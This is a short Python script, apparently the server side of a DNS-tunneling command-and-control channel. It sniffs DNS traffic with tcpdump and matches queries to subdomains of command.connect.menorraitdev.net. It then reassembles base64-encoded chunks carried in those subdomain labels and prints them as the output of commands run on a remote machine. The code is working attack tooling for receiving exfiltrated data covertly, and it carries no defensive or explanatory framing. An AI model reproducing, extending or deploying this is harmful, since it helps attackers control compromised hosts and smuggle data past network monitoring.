import subprocess
import base64
import re


chunks = {}

def process_chunk(chunk_number, chunk_data):
    chunks[chunk_number] = chunk_data

  
    expected_chunks = list(range(1, max(chunks.keys()) + 1))
    if sorted(chunks.keys()) == expected_chunks:
       
        full_output = "".join([chunks[i] for i in expected_chunks])
        decoded_output = base64.b64decode(full_output).decode("utf-8")
        print(f"Full command output:\n{decoded_output}")
        chunks.clear() 


def sniff_dns_queries():
    process = subprocess.Popen(
        ["sudo", "tcpdump", "-i", "any", "port", "53", "-n", "-l"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    chunk_pattern = re.compile(r"Chunk(\d+)\.(\S+)\.command\.connect\.menorraitdev\.net")

    try:
        for line in process.stdout:
            match = chunk_pattern.search(line)
            if match:
                chunk_number = int(match.group(1))
                chunk_data = match.group(2)
                print(f"Received chunk {chunk_number}: {chunk_data}")
                process_chunk(chunk_number, chunk_data)
            else:
                
                single_pattern = re.compile(r"(\S+)\.command\.connect\.menorraitdev\.net")
                single_match = single_pattern.search(line)
                if single_match:
                    single_data = single_match.group(1)
                    decoded_data = base64.b64decode(single_data).decode("utf-8")
                    print(f"Single command output:\n{decoded_data}")

    except KeyboardInterrupt:
        print("Stopping DNS sniffer.")
    finally:
        process.terminate()

if __name__ == "__main__":
    print("Starting DNS sniffer...")
    sniff_dns_queries()
